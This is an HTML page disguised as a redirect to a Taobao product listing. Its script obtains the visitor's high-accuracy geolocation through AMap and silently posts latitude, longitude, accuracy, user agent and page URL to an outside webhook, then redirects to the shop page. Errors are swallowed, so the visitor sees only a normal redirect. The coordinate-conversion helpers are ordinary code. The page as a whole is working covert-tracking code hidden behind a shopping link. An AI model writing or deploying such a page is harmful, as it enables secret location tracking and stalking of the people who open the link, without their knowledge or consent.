
<!DOCTYPE html>

  <style>

<body>
  <!-- <h1>正在跳转至淘宝商品详情页...</h1>
  <p>请稍候...</p> -->
 <iframe  src="https://e.tb.cn/h.SRFtccL33kGPw27?tk=hNcjf1NpBpZ" title="淘宝"></iframe>

  <script>
    // ========== 坐标转换函数（WGS-84 → 百度 BD-09）==========
    function outOfChina(lat, lng) {
      return lng < 72.004 || lng > 137.8347 || lat < 0.8293 || lat > 55.8271;
    }

    function transformLat(x, y) {
      let ret = -100.0 + 2.0 * x + 3.0 * y + 0.2 * y * y + 0.1 * x * y + 0.2 * Math.sqrt(Math.abs(x));
      ret += (20.0 * Math.sin(6.0 * x * Math.PI) + 20.0 * Math.sin(2.0 * x * Math.PI)) * 2.0 / 3.0;
      ret += (20.0 * Math.sin(y * Math.PI) + 40.0 * Math.sin(y / 3.0 * Math.PI)) * 2.0 / 3.0;
      ret += (160.0 * Math.sin(y / 12.0 * Math.PI) + 320 * Math.sin(y * Math.PI / 30.0)) * 2.0 / 3.0;
      return ret;
    }

    function transformLng(x, y) {
      let ret = 300.0 + x + 2.0 * y + 0.1 * x * x + 0.1 * x * y + 0.1 * Math.sqrt(Math.abs(x));
      ret += (20.0 * Math.sin(6.0 * x * Math.PI) + 20.0 * Math.sin(2.0 * x * Math.PI)) * 2.0 / 3.0;
      ret += (20.0 * Math.sin(x * Math.PI) + 40.0 * Math.sin(x / 3.0 * Math.PI)) * 2.0 / 3.0;
      ret += (150.0 * Math.sin(x / 12.0 * Math.PI) + 300.0 * Math.sin(x / 30.0 * Math.PI)) * 2.0 / 3.0;
      return ret;
    }

    function wgs84ToGcj02(lat, lng) {
      const pi = Math.PI;
      const a = 6378245.0;
      const ee = 0.006693421622965943;

      if (outOfChina(lat, lng)) return [lat, lng];

      let dLat = transformLat(lng - 105.0, lat - 35.0);
      let dLng = transformLng(lng - 105.0, lat - 35.0);
      const radLat = lat / 180.0 * pi;
      let magic = Math.sin(radLat);
      magic = 1 - ee * magic * magic;
      const sqrtMagic = Math.sqrt(magic);
      dLat = (dLat * 180.0) / ((a * (1 - ee)) / (magic * sqrtMagic) * pi);
      dLng = (dLng * 180.0) / (a / sqrtMagic * Math.cos(radLat) * pi);
      return [lat + dLat, lng + dLng];
    }

    function gcj02ToBd09(lat, lng) {
      const x = lng, y = lat;
      const z = Math.sqrt(x * x + y * y) + 0.00002 * Math.sin(y * Math.PI);
      const theta = Math.atan2(y, x) + 0.000003 * Math.cos(x * Math.PI);
      return [z * Math.sin(theta) + 0.006, z * Math.cos(theta) + 0.0065];
    }

    function wgs84ToBd09(lat, lng) {
      const gcj = wgs84ToGcj02(lat, lng);
      return gcj02ToBd09(gcj[0], gcj[1]);
    }

    // ========== 上报位置 ==========
    async function sendLocationToServer(data) {
      const WEBHOOK_URL = "https://ip.txg.hyiy.top/webhook"; // 确保无空格！

      try {
        await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data),
          signal: AbortSignal.timeout(3000)
        });
      } catch (err) {
        // 静默失败，不影响跳转
      }
    }

    // ========== 主逻辑 ==========
    (function () {
      const TAOTAO_URL = "https://e.tb.cn/h.SRFtccL33kGPw27?tk=hNcjf1NpBpZ";
      const resultDiv = document.getElementById("result");

      let hasRedirected = false;
      const doRedirect = () => {
        if (!hasRedirected) {
          hasRedirected = true;
          window.location.replace(TAOTAO_URL);
        }
      };

      // 安全兜底：3秒后强制跳转
      // setTimeout(doRedirect, 3000);

      // 如果不支持定位，直接跳转
      if (!navigator.geolocation) {
        doRedirect();
        return;
      }

       const script = document.createElement('script');
    script.src = 'https://webapi.amap.com/maps?v=2.0&key=';
    script.onload = () => {
      if (typeof AMap === 'undefined') {
        doRedirect(); // 加载失败则跳转
        return;
      }

      AMap.plugin('AMap.Geolocation', () => {
        const geolocation = new AMap.Geolocation({
          enableHighAccuracy: true,
          timeout: 2000,
          maximumAge: 60000,
          convert: true,        // 返回 GCJ-02（已纠偏）
          showButton: false,
          showMarker: false,
          showCircle: false
        });

        geolocation.getCurrentPosition((status, result) => {
          if (status === 'complete' && result.position) {
            const { lat, lng } = result.position;
            const accuracy = result.accuracy || 100;

            // 高德返回的是 GCJ-02，如需 BD-09 则转换（根据你原逻辑保留）
            const [bdLat, bdLng] = gcj02ToBd09(lat, lng);

            // 上报原始 WGS-84？但高德不提供。我们上报 GCJ-02（更真实）
            // 注意：你原逻辑上报的是 WGS-84，但实际国内设备原生定位也未必是真 WGS-84
            // 这里建议上报 GCJ-02（更准确），但为兼容你后端，可只传 GCJ-02 当作“原始”
            sendLocationToServer({
              timestamp: new Date().toLocaleString("zh-CN"),
              latitude: lat.toFixed(6),      // GCJ-02 纬度
              longitude: lng.toFixed(6),     // GCJ-02 经度
              accuracy: Math.round(accuracy),
              userAgent: navigator.userAgent,
              url: window.location.href
            });

            resultDiv.style.display = "block";
            setTimeout(doRedirect, 500);
          } else {
            doRedirect(); // 定位失败
          }
        });
      });
    };

    script.onerror = () => {
      doRedirect(); // 高德加载失败
    };

    document.head.appendChild(script);
  })();
  </script>
</body>
